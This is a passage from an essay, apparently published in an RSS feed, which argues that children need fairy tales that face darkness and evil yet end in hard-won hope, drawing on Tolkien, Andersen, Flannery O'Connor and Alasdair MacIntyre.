<p>To combat both the anxiety that comes to children robbed of the space to confront evil and the despair that holds that the last chapter of humanity’s tale is final defeat, we have to offer truer stories. Early in life, children need to be steeped in fairy tales that don’t gloss over the dark and ugly parts of the world. Children are wise; they reject the false advertising of cheap positive thinking for the real prize of hard-won hope. For a message of hope to be received, it must be hope that shines in darkness, hope that breaks the witch’s spell. “It is the mark of a good fairy-story,” J. R. R. Tolkien writes in his essay “On Fairy-Stories,” “that however wild its events, however fantastic or terrible the adventures, it can give to child or man that hears it, when the ‘turn’ comes, a catch of the breath, a beat and lifting of the heart, near to (or indeed accompanied by) tears.” But to tell such stories, we have to believe they are true. If we grown-ups don’t believe there is, as Tolkien calls it, “joy beyond the walls of the world,” then our children will not believe us when we share fairy tales that end with hope. And if we offer narratives of a world without hope, our stories are no better than the sanitized tales that refuse to acknowledge mortality and evil. They are simply a different way of failing to tell the whole truth.</p>
<p>But happily ever afters may be difficult to envision without an eternal perspective. At the end of Andersen’s story, the little mermaid loses her life and her body disintegrates into sea foam on the surface of the waves. But her sacrifice for her beloved is rewarded by the chance to gain a human soul and therefore to experience eternal life. This ending is only hopeful accompanied by a belief in an afterlife, just as Flannery O’Connor’s “A Good Man Is Hard to Find” only ends “happily” with a salvific outpouring of grace if we see eternal hope for the murdered grandmother. Perhaps it’s the loss of this eternal perspective that prevents us from seeing beyond darkness to hope.</p>
<p>“Deprive children of stories,” warns philosopher Alasdair MacIntyre, “and you leave them unscripted, anxious stutterers in their actions as in their words.” Like Hansel and Gretel leaving their little white pebbles along their path into the dark forest, the next generation needs us to provide them with touchstones that can keep them from getting lost on their journey and help them find their way back home. These pathfinders are the stories they’re told, stories that light up the dark, that reveal the existence of dragons hiding in the caves of life, and remind us that Saint George will be ultimately triumphant, even when it seems all hope is lost.</p>                
            </div></div>]]></description>
        </item>
    </channel>
</rss>